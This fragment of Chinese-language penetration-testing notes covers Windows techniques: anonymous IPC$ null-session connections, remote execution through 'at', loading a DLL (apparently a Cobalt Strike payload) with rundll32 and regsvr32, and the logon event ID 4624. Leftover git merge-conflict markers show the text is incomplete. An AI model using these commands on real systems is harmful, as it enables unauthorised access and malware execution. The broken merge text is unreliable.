...
```shell
net use \\192.168.163.130\ipc$ "" /user:"" # 匿名访问  
net use \\192.168.163.130\ipc$ /d # delete  
at \\192.168.163.130 c:\...exe
```

**dll**

 rundll32.exe cs.dll 入口函数  
 # 注册dll文件  
 regsvr32 cs.dll # 无入口函数

系统安全日志 登录成功4624
=======
>>>>>>> a2a91fb71f15f4cef36ebe9259234a4d942a3065
